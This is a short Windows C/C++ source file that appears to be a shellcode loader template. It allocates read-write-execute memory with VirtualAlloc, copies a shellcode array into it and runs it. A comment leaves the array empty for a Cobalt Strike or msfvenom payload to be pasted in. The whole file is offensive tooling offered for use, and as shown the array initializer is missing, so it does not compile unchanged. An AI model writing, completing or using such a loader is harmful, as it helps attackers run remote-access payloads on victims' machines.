#include "stdafx.h"
#include "Windows.h"

int main()
{
	unsigned char shellcode[] =
		/*
        cs shellcode or msfvenom
        */

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}